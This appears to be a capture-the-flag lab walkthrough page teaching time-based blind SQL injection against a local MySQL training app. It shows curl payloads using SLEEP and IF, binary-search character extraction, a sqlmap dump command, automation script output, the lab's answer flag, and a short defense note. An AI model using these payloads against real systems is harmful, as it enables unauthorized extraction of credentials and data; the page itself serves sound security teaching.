<h4>Step 1: Observe the Constant Response</h4>
<p>
    Enter any token: valid or invalid: and notice the page always shows
    the same message. There is no boolean signal to exploit.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. No Boolean Signal</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab11" --data-urlencode "token=abc123def456"<br>
        <span class="prompt">Response: </span><strong>Session checked.</strong><br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab11" --data-urlencode "token=totally_invalid_token"<br>
        <span class="prompt">Response: </span><strong>Session checked.</strong><br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab11" --data-urlencode "token='"<br>
        <span class="prompt">Response: </span><strong>Session checked.</strong> (even SQL errors produce the same output)
    </div>
</div>

<p>
    Since the response is always identical, we cannot use boolean-based techniques.
    The only remaining channel is <strong>response timing</strong>.
</p>

<h4>Step 2: Confirm Time-Based Injection with SLEEP()</h4>
<p>
    Inject <code>SLEEP(2)</code> to see if the response is delayed by 2 seconds.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Confirm SLEEP</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/mysql/lab11" --data-urlencode "token=' OR SLEEP(2) -- -"<br>
        <span class="prompt">Response: </span>Session checked. <strong>(elapsed: 10029ms -- ~10 seconds!)</strong><br>
        <span class="prompt">// </span>Note: SLEEP(2) fires <strong>per row</strong> in the sessions table.<br>
        <span class="prompt">// </span>With 5 rows: 2s &times; 5 = ~10 seconds total delay.<br><br>
        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/mysql/lab11" --data-urlencode "token=normal_input"<br>
        <span class="prompt">Response: </span>Session checked. <strong>(elapsed: ~25ms -- instant)</strong>
    </div>
</div>

<p>
    The 2-second delay confirms time-based injection. Note: <code>SLEEP()</code> returns 0
    and delays each row the query processes. Using <code>OR SLEEP(2)</code> means the sleep
    triggers for every row examined.
</p>

<h4>Step 3: Conditional Timing with IF()</h4>
<p>
    Use <code>IF(condition, SLEEP(2), 0)</code> to only delay when the condition is true.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Conditional IF + SLEEP</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/mysql/lab11" --data-urlencode "token=' OR IF(1=1, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>Session checked. <strong>(elapsed: 10034ms -- condition TRUE, 2s &times; 5 rows)</strong><br><br>
        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/mysql/lab11" --data-urlencode "token=' OR IF(1=2, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>Session checked. <strong>(elapsed: 28ms -- condition FALSE, instant)</strong>
    </div>
</div>

<p>
    We now have a reliable timing oracle: delay = TRUE, instant = FALSE.
</p>

<h4>Step 4: Extract the First Character</h4>
<p>
    Use <code>ASCII(SUBSTRING(...))</code> inside the <code>IF()</code> to test each
    character of the token. ASCII 70 = 'F'.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extract First Character</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>time curl -s "http://localhost/SQLi-Arena/mysql/lab11" --data-urlencode "token=' OR IF(ASCII(SUBSTRING((SELECT token FROM admin_tokens LIMIT 1),1,1))=70, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>Session checked. <strong>(elapsed: 10032ms -- SLEEP triggered!)</strong><br>
        <span class="prompt">Result: </span>ASCII 70 = 'F' -- first character confirmed!
    </div>
</div>

<h4>Step 5: Binary Search Optimization</h4>
<p>
    Instead of testing all 95 printable ASCII values, use binary search. Each character
    takes ~7 queries instead of potentially 95.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Binary Search (char at position 2)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Target: 'L' = ASCII 76</span><br><br>
        <span class="prompt">$ </span>time curl -s ".../token=' OR IF(ASCII(SUBSTRING(...,2,1))>64, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>10039ms (TRUE -- &gt; 64)<br><br>
        <span class="prompt">$ </span>time curl -s ".../token=' OR IF(ASCII(SUBSTRING(...,2,1))>96, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>22ms (FALSE -- not &gt; 96)<br><br>
        <span class="prompt">$ </span>time curl -s ".../token=' OR IF(ASCII(SUBSTRING(...,2,1))>80, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>22ms (FALSE -- not &gt; 80)<br><br>
        <span class="prompt">$ </span>time curl -s ".../token=' OR IF(ASCII(SUBSTRING(...,2,1))>72, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>10041ms (TRUE -- &gt; 72)<br><br>
        <span class="prompt">$ </span>time curl -s ".../token=' OR IF(ASCII(SUBSTRING(...,2,1))>76, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>24ms (FALSE -- not &gt; 76)<br><br>
        <span class="prompt">$ </span>time curl -s ".../token=' OR IF(ASCII(SUBSTRING(...,2,1))=76, SLEEP(2), 0) -- -"<br>
        <span class="prompt">Response: </span>10029ms (TRUE -- ASCII 76 = 'L' confirmed)
    </div>
</div>

<h4>Step 6: Extract Remaining Characters</h4>
<p>
    Continue for each position. Here are the first 10 characters extracted:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Progressive Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Pos 1:  </span>ASCII 70  = 'F'<br>
        <span class="prompt">Pos 2:  </span>ASCII 76  = 'L'<br>
        <span class="prompt">Pos 3:  </span>ASCII 65  = 'A'<br>
        <span class="prompt">Pos 4:  </span>ASCII 71  = 'G'<br>
        <span class="prompt">Pos 5:  </span>ASCII 123 = '{'<br>
        <span class="prompt">Pos 6:  </span>ASCII 116 = 't'<br>
        <span class="prompt">Pos 7:  </span>ASCII 49  = '1'<br>
        <span class="prompt">Pos 8:  </span>ASCII 109 = 'm'<br>
        <span class="prompt">Pos 9:  </span>ASCII 51  = '3'<br>
        <span class="prompt">Pos 10: </span>ASCII 95  = '_'
    </div>
</div>

<p>
    <strong>Tip:</strong> For the full 22-character flag, manual extraction requires
    ~154 requests (7 per character). A Python script or <code>sqlmap</code> can
    automate this:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Automation: sqlmap</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>sqlmap -u "http://target/SQLi-Arena/mysql/lab11" -d "token=test" -p token --technique=T --dbms=mysql -D sqli_arena_mysql_lab11 -T admin_tokens -C token --dump
    </div>
</div>

<h4>Step 7: Full Flag</h4>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Complete Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Position: </span> 1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22<br>
        <span class="prompt">Char:     </span> F  L  A  G  {  t  1  m  3  _  b  4  s  3  d  _  s  l  3  3  p  }<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{t1m3_b4s3d_sl33p}</strong>
    </div>
</div>

<h4>Step 8: Python Automation Script</h4>
<p>
    For the full 22-character flag, manual extraction requires ~154 time-delayed requests.
    Use this Python script to automate the binary search with timing oracle:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Python Automation (lab11_blind_time.py)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 scripts/lab11_blind_time.py http://localhost/SQLi-Arena<br><br>
        <span class="prompt">[*] </span>SLEEP duration: 2s | Threshold: 1.5s<br>
        <span class="prompt">[+] </span>Time-based oracle confirmed (SLEEP caused 2.03s delay)<br>
        <span class="prompt">[+] </span>Token length: 22<br>
        <span class="prompt">[*] </span>Extracting token (22 chars)...<br>
        <span class="prompt">&nbsp;&nbsp;[ 1/22] </span>F  (2.1s elapsed)<br>
        <span class="prompt">&nbsp;&nbsp;[ 2/22] </span>FL  (5.3s elapsed)<br>
        <span class="prompt">&nbsp;&nbsp;...</span><br>
        <span class="prompt">&nbsp;&nbsp;[22/22] </span>FLAG{t1m3_b4s3d_sl33p}  (78.4s elapsed)<br><br>
        <span class="prompt">[+] </span>Token: FLAG{t1m3_b4s3d_sl33p}
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script Source: lab11_blind_time.py</span>
    </div>
    <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab11_blind_time.py')); ?></pre></div>
</div>

<h4>Step 9: Submit the Token</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{t1m3_b4s3d_sl33p}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> When an application suppresses both data output and
    error messages AND shows the same response regardless of query results, time-based
    blind injection via <code>SLEEP()</code> is still possible. The attacker uses response
    timing as a 1-bit side channel. Defense: use prepared statements, and consider
    setting <code>max_execution_time</code> or query timeouts to limit SLEEP abuse.
</div>
